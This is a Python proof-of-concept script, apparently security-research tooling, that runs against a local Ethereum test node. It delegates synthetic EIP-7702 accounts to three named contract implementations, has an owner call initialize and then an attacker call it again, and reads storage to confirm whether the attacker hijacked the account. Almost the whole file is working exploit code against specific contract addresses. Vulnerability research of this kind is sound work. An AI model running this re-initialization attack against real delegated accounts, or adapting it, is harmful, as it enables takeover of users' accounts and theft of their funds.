import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
from web3 import Web3
from bytecode_oracle import EIP7702DelegationProbe

# The STATE-WRITE hits flagging initialize(address)=c4d66de8
TARGETS = {
    "fc2C64cE_deleg99": "0xfc2C64cE1C098A7328874Dd09d9a71E306D1a948",
    "b6da1852_deleg20": "0xb6da1852c218D74257593126fDfBd20F0BcEB2A8",
    "88CF071B_deleg110": "0x88CF071B4bF5facAB6712070a671F71282188d46",  # selector 169f67ed
}
SEL = {"fc2C64cE_deleg99": "c4d66de8", "b6da1852_deleg20": "c4d66de8",
       "88CF071B_deleg110": "169f67ed"}
a = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))
ownerA = a.eth.accounts[1]
attacker = a.eth.accounts[2]


def call(victim, sel, arg_addr, frm):
    data = "0x" + sel + arg_addr.lower().replace("0x", "").rjust(64, "0")
    try:
        h = a.eth.send_transaction({"from": frm, "to": victim, "data": data, "gas": 2_000_000})
        return a.eth.wait_for_transaction_receipt(h).status
    except Exception as e:
        return f"revert/{type(e).__name__}"


for i, (n, impl) in enumerate(TARGETS.items()):
    victim = Web3.to_checksum_address("0x7702" + f"{i+100:036x}")
    p = EIP7702DelegationProbe(a, victim)
    p.set_delegation(impl)
    sel = SEL[n]
    s0_before = a.eth.get_storage_at(victim, 0).hex()
    r1 = call(victim, sel, ownerA, ownerA)        # owner initializes
    s0_after1 = a.eth.get_storage_at(victim, 0).hex()
    r2 = call(victim, sel, attacker, attacker)     # attacker RE-initializes
    s0_after2 = a.eth.get_storage_at(victim, 0).hex()
    atk_word = attacker.lower().replace("0x", "").rjust(64, "0")
    reinit_won = atk_word in s0_after2.lower()
    print(f"\n{n} {impl} sel={sel}")
    print(f"  init#1(owner)={r1}  slot0={s0_after1[-40:]}")
    print(f"  init#2(attacker)={r2}  slot0={s0_after2[-40:]}")
    print(f"  RE-INIT BY ATTACKER SUCCEEDED (existing-account hijack): {reinit_won and r2==1}")
